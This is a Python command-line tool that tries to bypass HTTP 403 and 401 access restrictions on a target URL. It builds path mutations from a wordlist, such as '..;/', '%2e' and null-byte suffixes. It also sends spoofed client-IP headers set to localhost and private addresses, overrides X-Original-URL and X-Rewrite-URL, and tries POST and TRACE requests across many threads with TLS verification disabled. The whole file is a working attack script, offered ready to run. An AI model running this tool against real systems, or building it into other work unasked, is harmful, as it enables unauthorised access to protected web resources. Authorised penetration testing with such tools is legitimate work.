#!/usr/bin/python3
import sys
import os
import concurrent.futures
import requests
from tqdm import tqdm
from argparse import ArgumentParser

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BUILT_IN_WORD_LIST = "wordlist/list.txt"

def create_paths(path):
    paths = []
    paths.append(path)
    
    pairs = [["/", "//"], ["/.", "/./"]]
    
    leadings = ["/%2e"]
    
    trailings = ["/", "..;/", "/..;/", "%20", "%09", "%00", 
                ".json", ".css", ".html", "?", "??", 
                "?test", "#", "#test", "/."]
    
    for pair in pairs:
        paths.append(pair[0] + path + pair[1])
    
    for leading in leadings:
        paths.append(leading + path)
    
    for trailing in trailings:
        paths.append(path + trailing)

    return paths
    
def create_headers_with_path(path):
    headers = []

    headers_overwrite = ["X-Original-URL", "X-Rewrite-URL"]
    
    for header in headers_overwrite:
        headers.append({header : path})
    
    return headers

def create_headers():
    headers = []
    bypass_headers = ["X-Custom-IP-Authorization", "X-Forwarded-For", 
            "X-Forwarded", "Forwarded-For", "X-ProxyUser-Ip",
            "X-Forward-For", "X-Remote-IP", "X-Originating-IP", 
            "Client-IP", "True-Client-IP", "Cluster-Client-IP",
            "X-Remote-Addr", "X-Client-IP", "X-Real-IP",
            "Host"]
        
    values = ["localhost", "localhost:80", "localhost:443", 
            "127.0.0.1", "127.0.0.1:80", "127.0.0.1:443", 
            "10.0.0.0", "10.0.0.1", "172.16.0.0", 
            "172.16.0.1", "192.168.1.0", "192.168.1.1", 
            "::1"]
    
    for header in bypass_headers:
        for value in values:
            headers.append({header : value})

    return headers

def build_final_paths(words):
    final_paths = []
    words.append("")
    for path in words:
        for new_path in create_paths(path):
            final_paths.append(new_path)

    return final_paths

def build_final_headers_with_paths(words):
    final_headers = []
    words.append("")
    for path in words:
        for new_header in create_headers_with_path(path):
            final_headers.append(new_header)
            
    return final_headers

def make_request_with_path(url, path):
    try:
        url = url.rstrip("/")
        response = requests.get(f"{url}/{path}", timeout=5, allow_redirects=False, verify=False)
        length = len(response.content)
        return str(f"[*] {response.status_code} : {length} : {url}/{path}")
    except Exception as e:
        print(e)

def make_request_with_header(url, header):
    try:
        url = url.rstrip("/")
        response = requests.get(url, headers=header, timeout=5, allow_redirects=False, verify=False)
        length = len(response.content)
        return str(f"[*] {response.status_code} : {length} : {url} : {header}")
    except Exception as e:
        print(e)

def make_request_with_header_and_path(url, header):
    try:
        url = url.rstrip("/")
        path = list(header.values())[0]
        response = requests.get(f"{url}/{path}", headers=header, timeout=5, allow_redirects=False, verify=False)
        length = len(response.content)
        return str(f"[*] {response.status_code} : {length} : {url}/{path} : {header}")
    except Exception as e:
        print(e)

def check_url_for_path(paths, url, num_threads = 20):
    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        future_to_url = {executor.submit(make_request_with_path, url, path): path for path in paths}
        for future in tqdm(concurrent.futures.as_completed(future_to_url), total=len(paths), unit=" paths"):
            sub_ns_sc = future_to_url[future]
            try:
                if future.result() is not None:
                    results.append(future.result())
            except Exception as e:
                print(f"{e}")
                raise
    return results

def check_url_for_header(headers, url, num_threads = 20):
    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        future_to_url = {executor.submit(make_request_with_header, url, header): header for header in headers}
        for future in tqdm(concurrent.futures.as_completed(future_to_url), total=len(headers), unit=" headers"):
            sub_ns_sc = future_to_url[future]
            try:
                if future.result() is not None:
                    results.append(future.result())
            except Exception as e:
                print(f"{e}")
                raise
    return results
    
def check_url_for_header_and_path(headers, url, num_threads = 20):
    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        future_to_url = {executor.submit(make_request_with_header_and_path, url, header): header for header in headers}
        for future in tqdm(concurrent.futures.as_completed(future_to_url), total=len(headers), unit=" headers with paths"):
            sub_ns_sc = future_to_url[future]
            try:
                if future.result() is not None:
                    results.append(future.result())
            except Exception as e:
                print(f"{e}")
                raise
    return results

def check_url_for_post(url):
    try:
        url = url.rstrip("/")
        response = requests.post(f"{url}/", timeout=5, allow_redirects=False, verify=False)
        length = len(response.content)
        return str(f"[*] {response.status_code} : {length} : POST {url}/ ")
    except Exception as e:
        print(e)

def check_url_for_trace(url):
    try:
        url = url.rstrip("/")
        request = requests.Request("TRACE", f"{url}/")
        r = request.prepare()
        session = requests.Session()
        response = session.send(r, timeout=5, allow_redirects=False, verify=False)
        length = len(response.content)
        return str(f"[*] {response.status_code} : {length} : TRACE {url}/ ")
    except Exception as e:
        print(e)   

def scan(url, words, thread_default):
    final_paths = build_final_paths(words)
    final_headers = create_headers()
    final_headers_with_paths = build_final_headers_with_paths(words)

    final = []
    results = check_url_for_path(final_paths, url, thread_default)
    for response in results:
        final.append(response)
    
    results = check_url_for_header(final_headers, url, thread_default)
    for response in results:
        final.append(response)

    results = check_url_for_header_and_path(final_headers_with_paths, url, thread_default)
    for response in results:
        final.append(response)

    response = check_url_for_post(url)
    final.append(response)

    response = check_url_for_trace(url)
    final.append(response)

    for final_resp in final:
        print(final_resp)

def main():
    """
    Main program
    """
    parser = ArgumentParser()
    parser.add_argument("-u", "--url", dest="url", help="url to target")
    parser.add_argument("-w", "--word-list", dest="word_list", help="custom word list")
    parser.add_argument("-t", "--threads", dest="threads", help="number of threads")

    args = parser.parse_args()

    if len(sys.argv) < 2:
        parser.print_help()
        exit(1)

    thread_default = 40 
    if args.threads:
        thread_default = int(args.threads)

    if args.word_list:
        if not os.path.exists(args.word_list):
            print("[!] No word list specified.")
            exit(1)
        else:
            with open(args.word_list, "r") as file:
                words = file.readlines()
    else:
        if not os.path.exists(BUILT_IN_WORD_LIST):
            print("[!] No word list specified.")
            exit(1)
        else:
            with open(BUILT_IN_WORD_LIST, "r") as file:
                words = [line.rstrip() for line in file]

    scan(args.url, words, thread_default)


if __name__ == "__main__":
    main()